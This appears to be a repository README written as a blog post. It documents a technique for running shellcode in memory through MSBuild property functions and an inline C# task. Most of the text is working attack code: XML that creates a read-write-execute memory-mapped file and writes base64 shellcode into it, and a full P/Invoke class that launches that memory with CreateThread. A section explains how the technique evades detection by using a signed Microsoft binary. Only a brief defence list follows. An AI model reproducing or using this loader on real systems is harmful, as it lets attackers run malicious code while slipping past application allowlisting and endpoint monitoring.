# MSBuild-Monsters
Experimentations with the MSBuild Capabilites in a default environment.


# Executing Shellcode via MSBuild Property Functions

## Overview

MSBuild, Microsoft's build automation platform, has a powerful feature called "Property Functions" that allows calling .NET Framework methods directly within XML build files. This blog post demonstrates an advanced technique combining memory-mapped files and inline tasks to execute arbitrary code.

## The Technique

This approach leverages three key MSBuild capabilities:

### 1. Property Functions for Memory-Mapped Files

MSBuild property functions can instantiate and manipulate .NET objects. We create a memory-mapped file with Read-Write-Execute permissions:

```xml
<CreateMemoryMappedFile>
  $([System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew(
    $(MappedFileName), 
    272,
    $([System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute)
  ))
</CreateMemoryMappedFile>
```

This creates a 272-byte shared memory region with executable permissions - a critical requirement for code execution.

### 2. Writing Shellcode to Memory

Base64-encoded shellcode is decoded and written to the memory-mapped file:

```xml
<WriteToMemoryMappedFile>
  $([System.IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting(
    $(MappedFileName), 
    $([System.IO.MemoryMappedFiles.MemoryMappedFileRights]::FullControl)
  ).CreateViewStream().Write(
    $([System.Convert]::FromBase64String($(Shellcode))), 
    0, 
    272
  ))
</WriteToMemoryMappedFile>
```

### 3. Obtaining the Executable Memory Address

The memory handle is retrieved and converted to a hexadecimal string:

```xml
<GetRWXIntPtrMemoryMappedFile>
  $([System.IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting(
    $(MappedFileName), 
    $([System.IO.MemoryMappedFiles.MemoryMappedFileRights]::FullControl)
  ).CreateViewStream(
    0, 
    272, 
    $([System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute)
  ).SafeMemoryMappedViewHandle.DangerousGetHandle().ToString("X"))
</GetRWXIntPtrMemoryMappedFile>
```

This one-liner chains multiple method calls to extract the raw memory pointer.

### 4. Creating a Thread with CodeTaskFactory

Property functions alone cannot invoke unmanaged functions like `CreateThread`. MSBuild's `CodeTaskFactory` allows defining custom tasks with full C# code.

#### Understanding Code Types: Fragment vs Class

MSBuild inline tasks support two code types, but only one works for Win32 API calls:

**Type="Fragment"** - Limited to Method Body Code
```xml
<Code Type="Fragment" Language="cs">
  <![CDATA[
  // Code inserted directly into Execute() method
  Log.LogMessage("Simple operations only");
  ThreadHandle = ShellcodeAddress.ToUpper();
  return true;
  ]]>
</Code>
```

Fragment mode cannot declare:
- P/Invoke methods with `[DllImport]` attributes
- Custom delegate types
- Class-level fields or helper methods

**Type="Class"** - Required for P/Invoke
```xml
<Code Type="Class" Language="cs">
  <![CDATA[
  using System;
  using System.Runtime.InteropServices;
  
  public class CreateThreadTask : Task
  {
    // P/Invoke declarations - ONLY possible with Type="Class"
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    // Custom delegate - ONLY possible with Type="Class"
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr CreateThreadDelegate(
      IntPtr lpThreadAttributes,
      UIntPtr dwStackSize,
      IntPtr lpStartAddress,
      IntPtr lpParameter,
      uint dwCreationFlags,
      out uint lpThreadId
    );
    
    [Required]
    public string ShellcodeAddress { get; set; }
    
    [Output]
    public string ThreadHandle { get; set; }
    
    public override bool Execute()
    {
      // Load kernel32.dll dynamically
      IntPtr kernel32 = LoadLibrary("kernel32.dll");
      if (kernel32 == IntPtr.Zero)
      {
        Log.LogError("Failed to load kernel32.dll");
        return false;
      }
      
      // Resolve CreateThread address
      IntPtr createThreadAddr = GetProcAddress(kernel32, "CreateThread");
      if (createThreadAddr == IntPtr.Zero)
      {
        Log.LogError("Failed to get CreateThread address");
        return false;
      }
      
      // Create managed delegate from function pointer
      var createThreadDelegate = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(
        createThreadAddr, 
        typeof(CreateThreadDelegate)
      );
      
      // Parse hex string to IntPtr
      IntPtr shellcodePtr = new IntPtr(
        long.Parse(ShellcodeAddress, System.Globalization.NumberStyles.HexNumber)
      );
      
      // Execute CreateThread
      uint threadId;
      IntPtr hThread = createThreadDelegate(
        IntPtr.Zero,      // No security attributes
        UIntPtr.Zero,     // Default stack size
        shellcodePtr,     // Start address (our shellcode)
        IntPtr.Zero,      // No parameters
        0,                // Run immediately
        out threadId      // Receive thread ID
      );
      
      ThreadHandle = hThread.ToString("X");
      Log.LogMessage(MessageImportance.High, "Thread Handle: 0x" + ThreadHandle);
      Log.LogMessage(MessageImportance.High, "Thread ID: " + threadId.ToString());
      
      return true;
    }
  }
  ]]>
</Code>
```

**Why Type="Class" is Mandatory Here:**

The `[DllImport]` attribute and custom delegate declarations must exist at class scope, not within a method body. When you attempt to use Fragment mode with P/Invoke, MSBuild generates invalid C# code placing these declarations inside the `Execute()` method, causing compilation errors like "Invalid token" and "Expected class, delegate, enum, interface, or struct."

For any Win32 API interop or complex marshaling scenarios, you must use `Type="Class"`.

## Complete Execution Flow

1. **Environment Setup**: Set `MSBUILDENABLEALLPROPERTYFUNCTIONS=1`
2. **Memory Allocation**: Create RWX memory-mapped file
3. **Shellcode Injection**: Write base64-decoded shellcode to memory
4. **Address Resolution**: Extract memory pointer as hex string
5. **Thread Creation**: Invoke `CreateThread` via inline C# task
6. **Execution**: Shellcode runs in new thread context

## Why This Works

1. **No Binary Drops**: Everything executes in-memory through MSBuild.exe.. Kind of... 
2. **Signed Binary**: MSBuild.exe is a legitimate Microsoft-signed executable
3. **Complex Detection**: The technique splits execution across XML properties and inline C# code
4. **Built-in Functionality**: Uses only features shipped with .NET Framework 4.0+

## Defense Considerations

- Monitor MSBuild execution outside build environments
- Restrict `MSBUILDENABLEALLPROPERTYFUNCTIONS` environment variable, not sure how tbh lol
- Implement application whitelisting policies
- Analyze XML files for suspicious property functions and inline tasks
- Detect memory-mapped files with execute permissions
- Watch for `CodeTaskFactory` usage with P/Invoke patterns

## Conclusion

This technique showcases how extensible build systems can be repurposed for code execution. Understanding the distinction between Fragment and Class code types is crucial - Win32 API interop requires full class definitions with proper P/Invoke declarations.

The approach demonstrates that legitimate development tools, when combined creatively, can achieve sophisticated code execution without traditional malware artifacts.

**Credit**: Original research by Casey  (@_subTee)

---

*This post demonstrates MSBuild capabilities. Use responsibly and only in authorized environments. Brush your teeth and floss too, also, consider eating less, excercising more, while we're giving advice.*
